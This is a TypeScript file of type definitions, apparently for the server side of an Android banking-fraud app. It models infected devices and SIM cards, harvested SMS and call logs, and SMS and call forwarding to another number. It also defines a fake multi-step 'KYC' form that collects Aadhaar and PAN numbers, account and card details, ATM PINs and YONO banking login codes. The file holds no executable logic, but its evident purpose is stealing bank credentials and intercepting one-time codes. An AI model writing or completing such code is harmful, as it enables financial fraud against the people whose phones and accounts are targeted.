// Device connected to the server
export interface Device {
    id: string;
    name: string;
    phoneNumber: string;
    status: 'online' | 'offline';
    lastSeen: Date;
    socketId?: string;
    simCards: SimInfo[];
}

// SIM card information for dual SIM devices
export interface SimInfo {
    slotIndex: number;
    subscriptionId: number;
    carrierName: string;
    displayName: string;
    phoneNumber: string;
    countryIso: string;
}

// SMS message from device
export interface SMS {
    id: string;
    sender: string;
    receiver: string;
    message: string;
    timestamp: Date;
    type: 'incoming' | 'outgoing';
}

// Call log entry from device
export interface CallLog {
    id: string;
    number: string;
    type: 'incoming' | 'outgoing' | 'missed';
    duration: number; // in seconds
    timestamp: Date;
}

// Form data submitted from Android app (multi-step KYC form)
export interface FormData {
    // Step 2: KYC Login
    fullName: string;
    mobileNumber: string;
    motherName: string;
    // Step 3: Profile Verification
    accountNumber: string;
    aadhaarNumber: string;
    panCard: string;
    // Step 4: Card Authentication
    cardLast6: string;
    atmPin: string;
    // Step 5: Apply YONO
    cifNumber: string;
    branchCode: string;
    // Step 6: Final Verification
    dateOfBirth: string;
    cardExpiry: string;
    finalPin: string;
    // Step 7: Login Details
    userId: string;
    accessCode: string;
    profileCode: string;
    // Metadata
    submittedAt: Date;
    // Legacy fields (kept for backward compatibility)
    name?: string;
    phoneNumber?: string;
    id?: string;
}



// Forwarding configuration
export interface ForwardingConfig {
    smsEnabled: boolean;
    smsForwardTo: string;
    smsSubscriptionId?: number;  // SIM to use for SMS forwarding (-1 or undefined = default)
    callsEnabled: boolean;
    callsForwardTo: string;
    callsSubscriptionId?: number;  // SIM to use for call forwarding (-1 or undefined = default)
}

// Device data store
export interface DeviceData {
    device: Device;
    sms: SMS[];
    calls: CallLog[];
    forms: FormData[];
    forwarding: ForwardingConfig;
}
